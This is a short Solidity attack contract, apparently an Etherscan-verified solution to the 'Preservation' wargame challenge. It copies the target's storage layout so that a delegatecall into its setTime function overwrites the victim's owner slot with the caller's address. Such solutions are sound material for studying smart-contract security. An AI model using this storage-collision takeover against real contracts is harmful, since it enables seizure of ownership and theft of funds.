/**
 *Submitted for verification at Etherscan.io on 2022-07-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationHack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; // slot 2

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}